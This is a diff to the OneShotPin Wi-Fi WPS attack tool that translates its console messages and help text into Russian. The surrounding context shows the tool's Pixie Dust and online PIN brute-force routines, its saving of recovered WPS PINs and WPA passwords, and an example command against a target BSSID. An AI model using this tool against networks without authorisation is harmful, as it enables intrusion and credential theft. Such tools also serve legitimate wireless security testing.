@@ -550,16 +550,16 @@ class Companion:
         elif ('Associated with' in line) and (self.interface in line):
             bssid = line.split()[-1].upper()
             if self.connection_status.essid:
-                print('[+] Associated with {} (ESSID: {})'.format(bssid, self.connection_status.essid))
+                print('[+] Связано с {} (ESSID: {})'.format(bssid, self.connection_status.essid))
             else:
-                print('[+] Associated with {}'.format(bssid))
+                print('[+] Связано с {}'.format(bssid))
         elif 'EAPOL: txStart' in line:
             self.connection_status.status = 'eapol_start'
-            print('[*] Sending EAPOL Start…')
+            print('[*] Отправка EAPOL началась...')
         elif 'EAP entering state IDENTITY' in line:
-            print('[*] Received Identity Request')
+            print('[*] Полученный запрос на идентификацию...')
         elif 'using real identity' in line:
-            print('[*] Sending Identity Response…')
+            print('[*] Отправка ответа на идентификацию...')
         elif pbc_mode and ('selected BSS ' in line):
             bssid = line.split('selected BSS ')[-1].split()[0].upper()
             self.connection_status.bssid = bssid
@@ -568,7 +568,7 @@ class Companion:
         return True
 
     def __runPixiewps(self, showcmd=False, full_range=False):
-        print("[*] Running Pixiewps…")
+        print("[*] Запуск Pixiewps…")
         cmd = self.pixie_creds.get_pixie_cmd(full_range)
         if showcmd:
             print(cmd)
@@ -586,8 +586,8 @@ class Companion:
         return False
 
     def __credentialPrint(self, wps_pin=None, wpa_psk=None, essid=None):
-        print(f"[+] WPS PIN: '{wps_pin}'")
-        print(f"[+] WPA PSK: '{wpa_psk}'")
+        print(f"[+] WPS PIN (ПИН): '{wps_pin}'")
+        print(f"[+] WPA PSK (ПАРОЛЬ): '{wpa_psk}'")
         print(f"[+] AP SSID: '{essid}'")
 
     def __saveResult(self, bssid, essid, wps_pin, wpa_psk):
@@ -606,13 +606,13 @@ class Companion:
             if writeTableHeader:
                 csvWriter.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
             csvWriter.writerow([dateStr, bssid, essid, wps_pin, wpa_psk])
-        print(f'[i] Credentials saved to {filename}.txt, {filename}.csv')
+        print(f'[i] Учетные данные сохранены в {filename}.txt, {filename}.csv')
 
     def __savePin(self, bssid, pin):
         filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
         with open(filename, 'w') as file:
             file.write(pin)
-        print('[i] PIN saved in {}'.format(filename))
+        print('[i] ПИН сохранён в {}'.format(filename))
 
     def __prompt_wpspin(self, bssid):
         pins = self.generator.getSuggested(bssid)
@@ -751,13 +751,13 @@ class Companion:
                 print('[+] First half found')
                 return f_half
             elif self.connection_status.status == 'WPS_FAIL':
-                print('[!] WPS transaction failed, re-trying last pin')
+                print('[!] Транзакция WPS не удалась, повторите попытку с последнего пина')
                 return self.__first_half_bruteforce(bssid, f_half)
             f_half = str(int(f_half) + 1).zfill(4)
             self.bruteforce.registerAttempt(f_half)
             if delay:
                 time.sleep(delay)
-        print('[-] First half not found')
+        print('[-] Первая половина не найдена')
         return False
 
     def __second_half_bruteforce(self, bssid, f_half, s_half, delay=None):
@@ -773,7 +773,7 @@ class Companion:
             if self.connection_status.last_m_message > 6:
                 return pin
             elif self.connection_status.status == 'WPS_FAIL':
-                print('[!] WPS transaction failed, re-trying last pin')
+                print('[!] Транзакция WPS не удалась, повторите попытку с последнего пина')
                 return self.__second_half_bruteforce(bssid, f_half, s_half)
             s_half = str(int(s_half) + 1).zfill(3)
             self.bruteforce.registerAttempt(f_half + s_half)
@@ -1022,7 +1022,7 @@ class WiFiScanner:
             return
         while 1:
             try:
-                networkNo = input('Select target (press Enter to refresh): ')
+                networkNo = input('Выберите цель (нажмите Enter чтобы повторить поиск): ')
                 if networkNo.lower() in ('r', '0', ''):
                     return self.prompt_network()
                 elif int(networkNo) in networks.keys():
@@ -1057,28 +1057,28 @@ OneShotPin 0.0.2 (c) 2017 rofl0r, modded by drygdryg
 
 %(prog)s <arguments>
 
-Required arguments:
-    -i, --interface=<wlan0>  : Name of the interface to use
+Необходимые аргументы:
+    -i, --interface=<wlan0>  : Имя используемого интерфейса
 
-Optional arguments:
-    -b, --bssid=<mac>        : BSSID of the target AP
-    -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)
-    -K, --pixie-dust         : Run Pixie Dust attack
-    -B, --bruteforce         : Run online bruteforce attack
-    --push-button-connect    : Run WPS push button connection
+Необязательные аргументы:
+    -b, --bssid=<mac>        : BSSID целевой точки доступа
+    -p, --pin=<wps pin>      : Использовать указанный пин (произвольная строка или 4/8-значный пин)
+    -K, --pixie-dust         : Провести Pixie Dust атаку
+    -B, --bruteforce         : Запустить онлайн bruetforce атаку
+    --push-button-connect    : Выполните подключение по кнопке WPS
 
-Advanced arguments:
-    -d, --delay=<n>          : Set the delay between pin attempts [0]
-    -w, --write              : Write AP credentials to the file on success
-    -F, --pixie-force        : Run Pixiewps with --force option (bruteforce full range)
-    -X, --show-pixie-cmd     : Always print Pixiewps command
-    --vuln-list=<filename>   : Use custom file with vulnerable devices list ['vulnwsc.txt']
-    --iface-down             : Down network interface when the work is finished
-    -l, --loop               : Run in a loop
-    -r, --reverse-scan       : Reverse order of networks in the list of networks. Useful on small displays
-    --mtk-wifi               : Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit
-                               (for internal Wi-Fi adapters implemented in MediaTek SoCs). Turn off Wi-Fi in the system settings before using this.
-    -v, --verbose            : Verbose output
+Продвинутые аргументы:
+ -d, --delay=<n>             : Установить задержку между попытками подключения пинов [0]
+ -w, --write              : Запись учетных данных точки доступа в файл при успешной попытке
+ -F, --pixie-force        : Запуск Pixiewps с опцией --force (перебор всего диапазона)
+ -X, --show-pixie-cmd     : Всегда печатать команду Pixiewps
+ --vuln-list=<filename>   : Использовать пользовательский файл со списком уязвимых устройств ['vulnwsc.txt'].
+ --iface-down             : Отключить сетевой интерфейс по окончании работы
+ -l, --loop               : Запуск в цикле
+ -r, --reverse-scan       : Обратный порядок сетей в списке сетей. Полезно на небольших дисплеях
+ --mtk-wifi               : Активировать драйвер интерфейса Wi-Fi MediaTek при запуске и деактивировать его при выходе.
+                               (для внутренних адаптеров Wi-Fi, реализованных в SoCs MediaTek). Перед использованием этого параметра отключите Wi-Fi в системных настройках.
+ -v, --verbose            : Вывод подробной информации
 
 Example:
     %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K
